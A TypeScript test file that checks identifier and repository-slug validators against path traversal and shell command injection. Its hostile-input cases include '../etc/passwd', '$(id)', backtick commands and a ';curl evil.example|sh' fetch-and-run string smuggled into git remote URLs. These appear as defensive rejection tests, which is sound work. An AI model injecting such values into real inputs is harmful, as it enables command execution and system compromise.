import test from 'node:test';
import assert from 'node:assert/strict';
import { resolve } from 'node:path';
import {
  MAX_IDENTIFIER_LENGTH,
  assertOptionalSafeIdentifier,
  assertSafeIdentifier,
  assertWithinRoot,
  isSafeIdentifier,
} from './identifiers.js';
import { UNKNOWN_REPO_SLUG, deriveRepoSlug, isSafeRepoSlug } from './repo-slug.js';

// ---------------------------------------------------------------------------
// identifiers
// ---------------------------------------------------------------------------

test('isSafeIdentifier accepts plain identifiers', () => {
  for (const value of ['inv-1775800639948', 'campaign.1', 'a_b-C9', 'x']) {
    assert.equal(isSafeIdentifier(value), true, `${value} should be safe`);
  }
});

test('isSafeIdentifier rejects traversal, separators and junk', () => {
  const unsafe = [
    '../etc/passwd',
    '..',
    '.',
    'a/b',
    'a\\b',
    '',
    ' leading',
    'trailing ',
    'a b',
    'x'.repeat(MAX_IDENTIFIER_LENGTH + 1),
    undefined,
    42,
    null,
  ];
  for (const value of unsafe) {
    assert.equal(isSafeIdentifier(value as unknown), false, `${String(value)} should be unsafe`);
  }
});

test('assertSafeIdentifier names the offending input', () => {
  assert.equal(assertSafeIdentifier('inv-1', '--resume campaign id'), 'inv-1');
  assert.throws(
    () => assertSafeIdentifier('../../etc', '--resume campaign id'),
    /Invalid --resume campaign id/,
  );
});

test('assertOptionalSafeIdentifier passes undefined through', () => {
  assert.equal(assertOptionalSafeIdentifier(undefined, '--campaign id'), undefined);
  assert.equal(assertOptionalSafeIdentifier('inv-2', '--campaign id'), 'inv-2');
  assert.throws(() => assertOptionalSafeIdentifier('../x', '--campaign id'), /Invalid --campaign id/);
});

test('assertWithinRoot rejects escapes without a false prefix match', () => {
  assert.equal(assertWithinRoot('/data/runs/inv-1', '/data/runs', 'run dir'), '/data/runs/inv-1');
  // Traversal must be resolved before the check (callers pass resolved paths).
  assert.throws(
    () => assertWithinRoot(resolve('/data/runs', '../evil'), '/data/runs', 'run dir'),
    /outside/,
  );
  // A sibling directory sharing a prefix must not pass.
  assert.throws(() => assertWithinRoot('/data/runs-evil/x', '/data/runs', 'run dir'), /outside/);
});

// ---------------------------------------------------------------------------
// repo slug derivation
// ---------------------------------------------------------------------------

test('deriveRepoSlug returns a valid explicit slug unchanged', () => {
  assert.equal(deriveRepoSlug('/tmp/does-not-matter', 'acme/widgets'), 'acme/widgets');
});

test('deriveRepoSlug rejects an unsafe --repo-slug', () => {
  for (const unsafe of ['acme/widgets$(id)', 'acme/wid`gets`', 'acme', 'acme/widgets/extra', 'a b/c']) {
    assert.throws(() => deriveRepoSlug('/tmp/x', unsafe), /Invalid --repo-slug/, unsafe);
  }
});

test('deriveRepoSlug parses normal https and ssh remotes', () => {
  const https = deriveRepoSlug('/tmp/x', undefined, () => 'https://github.com/acme/widgets.git');
  assert.equal(https, 'acme/widgets');

  const ssh = deriveRepoSlug('/tmp/x', undefined, () => 'git@github.com:acme/widgets.git');
  assert.equal(ssh, 'acme/widgets');
});

test('deriveRepoSlug discards a hostile origin URL instead of interpolating it', () => {
  const hostile = [
    'https://github.com/acme/$(touch /tmp/pwned)/widgets.git',
    'https://github.com/acme/`touch /tmp/pwned`/widgets.git',
    'https://github.com/acme/;curl evil.example|sh/widgets.git',
    'git@github.com:acme/$(id)/widgets.git',
  ];
  for (const remote of hostile) {
    const slug = deriveRepoSlug('/tmp/x', undefined, () => remote);
    assert.equal(slug, UNKNOWN_REPO_SLUG, remote);
    assert.equal(isSafeRepoSlug(slug), true);
  }
});

test('deriveRepoSlug falls back when no remote is readable', () => {
  assert.equal(deriveRepoSlug('/tmp/x', undefined, () => null), UNKNOWN_REPO_SLUG);
  assert.equal(deriveRepoSlug('/tmp/x', undefined, () => ''), UNKNOWN_REPO_SLUG);
});
